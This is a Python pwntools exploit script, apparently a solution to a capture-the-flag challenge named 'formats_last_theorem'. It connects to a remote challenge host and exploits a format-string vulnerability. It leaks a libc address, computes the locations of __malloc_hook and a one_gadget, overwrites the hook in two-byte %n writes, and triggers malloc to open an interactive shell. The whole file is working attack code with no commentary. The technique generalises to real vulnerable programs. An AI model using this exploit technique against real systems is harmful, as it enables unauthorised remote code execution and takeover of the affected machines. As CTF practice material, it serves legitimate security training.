from pwn import *
import time

#c = process("./formats_last_theorem")
c = remote("dctf-chall-formats-last-theorem.westeurope.azurecontainer.io", 7482)


def write(addr, off, malloc_hook):
	payload = b'%%%dc%%8$n' % addr
	payload += b'A'*5
	payload += p64(malloc_hook + off)
	c.sendline(payload)

def main():
	libc_start_main_off = 0x021b10 + 231
	malloc_hook_off = 0x00000000003ebc30

	payload = b'%23$p'
	c.sendline(payload)
	c.recvuntil('you entered\n')
	leak = int(c.recv()[:14], 0)
	libc = leak - libc_start_main_off
	log.success("__libc_start_main: " + hex(leak))
	log.critical("libc address: " + hex(libc))
	malloc_hook = libc + malloc_hook_off
	log.success("__malloc_hook: " + hex(malloc_hook))
	one_gadget = hex(libc + 0x4f432)
	log.success("one gadget: " + one_gadget)

	addr1 = int('0x' + one_gadget[10:14], 0)
	addr2 = int('0x' + one_gadget[6:10], 0)
	addr3 = int('0x' + one_gadget[2:6], 0)

	write(addr1, 0, malloc_hook)
	write(addr2, 2, malloc_hook)
	write(addr3, 4, malloc_hook)

	log.info("Triggering malloc")
	c.sendline("%100000c")
	time.sleep(2)
	c.interactive()



if __name__ == '__main__':
	main()
